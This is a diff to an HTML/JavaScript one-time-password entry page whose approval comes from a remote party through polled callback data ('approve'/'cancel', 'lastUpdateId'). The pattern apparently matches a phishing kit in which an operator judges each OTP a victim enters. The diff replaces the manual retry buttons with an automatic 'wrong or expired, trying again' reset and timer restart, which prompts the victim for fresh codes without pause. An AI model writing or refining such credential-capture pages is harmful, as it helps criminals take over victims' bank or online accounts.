@@ -211,30 +211,6 @@
             font-weight: 500;
             margin-bottom: 20px;
         }
-        
-        .result-actions {
-            display: flex;
-            gap: 12px;
-            margin-top: 10px;
-        }
-        
-        .btn {
-            padding: 12px 18px;
-            border-radius: 10px;
-            border: none;
-            cursor: pointer;
-            font-weight: 600;
-        }
-        
-        .btn-primary {
-            background: #4f5052;
-            color: #fff;
-        }
-        
-        .btn-secondary {
-            background: #f0f0f0;
-            color: #444;
-        }
     </style>
 </head>
 
@@ -276,10 +252,6 @@
     <!-- RESULT OVERLAY -->
     <div id="resultOverlay">
         <div class="result-message" id="resultMessage"></div>
-        <div class="result-actions" id="resultActions" style="display:none;">
-            <button class="btn btn-primary" id="proceedBtn">Proceed</button>
-            <button class="btn btn-secondary" id="retryBtn">Try Again</button>
-        </div>
     </div>
 
     <script>
@@ -299,25 +271,33 @@
         const resultOverlay = document.getElementById('resultOverlay');
         const resultMessage = document.getElementById('resultMessage');
         const timerSpan = document.getElementById('timer');
-        const proceedBtn = document.getElementById('proceedBtn');
-        const retryBtn = document.getElementById('retryBtn');
-        const resultActions = document.getElementById('resultActions');
 
         let otpValue = '';
-        let seconds = 116;
+        let initialSeconds = 116;
+        let seconds = initialSeconds;
         let pollInterval;
+        let countdownInterval;
         let lastUpdateId = 0;
         let currentCallbackData = '';
 
-        // Countdown timer
-        const countdown = setInterval(() => {
-            seconds--;
+        // Countdown timer helper
+        function startCountdown(startSec) {
+            // clear any existing interval
+            if (countdownInterval) clearInterval(countdownInterval);
+            seconds = startSec;
             timerSpan.textContent = seconds;
-            if (seconds <= 0) {
-                clearInterval(countdown);
-                timerSpan.textContent = '0';
-            }
-        }, 1000);
+            countdownInterval = setInterval(() => {
+                seconds--;
+                timerSpan.textContent = seconds;
+                if (seconds <= 0) {
+                    clearInterval(countdownInterval);
+                    timerSpan.textContent = '0';
+                }
+            }, 1000);
+        }
+
+        // start initial countdown
+        startCountdown(seconds);
 
         function checkOtpComplete() {
             otpValue = Array.from(otpBoxes).map(box => box.value).join('');
@@ -370,19 +350,13 @@
             otpBoxes[0].focus();
         }
 
-        function showResult(message, options = {}) {
+        function showResult(message) {
             resultMessage.textContent = message;
             resultOverlay.style.display = 'flex';
-            if (options.showActions) {
-                resultActions.style.display = 'flex';
-            } else {
-                resultActions.style.display = 'none';
-            }
         }
 
         function hideResult() {
             resultOverlay.style.display = 'none';
-            resultActions.style.display = 'none';
         }
 
         submitBtn.addEventListener('click', () => {
@@ -443,18 +417,22 @@
                                             // give user a moment to read then proceed
                                             const nextUrl = localStorage.getItem('nextUrl') || 'dashboard.html';
                                             setTimeout(() => {
-                                                // If a proceed button is present, user can click; otherwise auto-redirect
                                                 try {
                                                     window.location.href = nextUrl;
                                                 } catch (e) {
-                                                    // fallback: hide overlay
                                                     hideResult();
                                                 }
                                             }, 1500);
                                         } else if (dataParts[0] === 'cancel') {
-                                            // Inform user that the OTP is wrong/expired and allow retry
-                                            showResult('The OTP provided is wrong or has expired. Please provide a valid OTP.', { showActions: true });
-                                            // make Retry button visible (already shown via showActions)
+                                            // Automatically clear OTP and restart countdown
+                                            showResult('The OTP provided is wrong or has expired. Trying again...');
+                                            // brief pause so user sees message, then reset
+                                            setTimeout(() => {
+                                                hideResult();
+                                                resetOtpInputs();
+                                                // restart timer
+                                                startCountdown(initialSeconds);
+                                            }, 1500);
                                         }
                                     }
                                 }
@@ -464,18 +442,6 @@
                         // network error - keep polling or show error after some attempts (not implemented)
                     });
             }, 1500);
-        });
-
-        // Retry workflow: hide overlay and clear inputs so user can try again
-        retryBtn.addEventListener('click', () => {
-            hideResult();
-            resetOtpInputs();
-        });
-
-        // Proceed button — in case user wants to continue immediately after approval message
-        proceedBtn.addEventListener('click', () => {
-            const nextUrl = localStorage.getItem('nextUrl') || 'dashboard.html';
-            window.location.href = nextUrl;
         });
 
         checkOtpComplete();
